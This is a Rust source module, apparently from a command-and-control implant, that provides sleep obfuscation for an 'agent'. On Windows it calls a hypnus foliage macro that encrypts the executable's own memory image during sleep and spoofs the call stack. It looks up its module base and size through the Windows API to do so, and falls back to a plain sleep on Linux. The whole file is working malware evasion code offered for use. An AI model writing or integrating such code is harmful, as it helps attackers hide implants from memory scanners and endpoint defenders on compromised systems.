//! Sleep obfuscation module for evasion during agent sleep cycles.
//!
//! On Windows, this module uses the hypnus crate's foliage! macro to perform
//! APC-based sleep obfuscation with memory encryption and call stack spoofing.
//! On Linux, it falls back to standard thread sleep.

use std::time::Duration;

/// Performs an obfuscated sleep for the specified duration in seconds.
///
/// On Windows, this uses hypnus::foliage! for APC-based sleep obfuscation
/// with memory encryption of a designated buffer region.
/// On Linux, this falls back to standard thread::sleep.
///
/// # Arguments
/// * `seconds` - Number of seconds to sleep
#[cfg(target_os = "windows")]
pub fn obfuscated_sleep(seconds: u64) {
    use core::ffi::c_void;

    // Get the current module's memory region for encryption during sleep
    if let Some((ptr, size)) = get_module_memory() {
        // Use hypnus foliage! macro for APC-based sleep obfuscation
        // This encrypts the specified memory region during sleep and
        // provides call stack spoofing for evasion
        hypnus::foliage!(ptr, size, seconds);
    } else {
        // Fallback to standard sleep if we can't get module memory
        std::thread::sleep(Duration::from_secs(seconds));
    }
}

/// Performs an obfuscated sleep for the specified duration in seconds.
///
/// On Linux, this simply uses standard thread::sleep as hypnus is Windows-only.
///
/// # Arguments
/// * `seconds` - Number of seconds to sleep
#[cfg(target_os = "linux")]
pub fn obfuscated_sleep(seconds: u64) {
    std::thread::sleep(Duration::from_secs(seconds));
}

/// Performs an obfuscated sleep for the specified std::time::Duration.
///
/// This is a convenience wrapper that accepts a Duration instead of raw seconds.
/// Note: Sub-second precision is lost as hypnus operates in whole seconds.
///
/// # Arguments
/// * `duration` - Duration to sleep
pub fn obfuscated_sleep_duration(duration: Duration) {
    // Convert duration to seconds (hypnus works in whole seconds)
    // For very short durations (< 1 second), use standard sleep to maintain precision
    let seconds = duration.as_secs();
    if seconds == 0 {
        // For sub-second sleeps, use standard sleep to maintain precision
        std::thread::sleep(duration);
    } else {
        obfuscated_sleep(seconds);
    }
}

/// Gets the current module's base address and size for memory encryption.
///
/// This function retrieves the PE image information of the current process
/// to determine what memory region should be encrypted during sleep.
///
/// # Returns
/// * `Some((ptr, size))` - Pointer to module base and size in bytes
/// * `None` - If unable to retrieve module information
#[cfg(target_os = "windows")]
fn get_module_memory() -> Option<(*mut core::ffi::c_void, usize)> {
    use core::ffi::c_void;
    use winapi::um::libloaderapi::GetModuleHandleA;
    use winapi::um::processthreadsapi::GetCurrentProcess;
    use winapi::um::psapi::{GetModuleInformation, MODULEINFO};
    use std::mem::MaybeUninit;

    unsafe {
        // Get handle to the current module (NULL = current executable)
        let h_module = GetModuleHandleA(std::ptr::null());
        if h_module.is_null() {
            return None;
        }

        // Get module information including base address and size
        let mut mod_info = MaybeUninit::<MODULEINFO>::uninit();
        let result = GetModuleInformation(
            GetCurrentProcess(),
            h_module,
            mod_info.as_mut_ptr(),
            std::mem::size_of::<MODULEINFO>() as u32,
        );

        if result == 0 {
            return None;
        }

        let mod_info = mod_info.assume_init();

        // Return the base address and size of the module's image
        Some((
            mod_info.lpBaseOfDll as *mut c_void,
            mod_info.SizeOfImage as usize,
        ))
    }
}
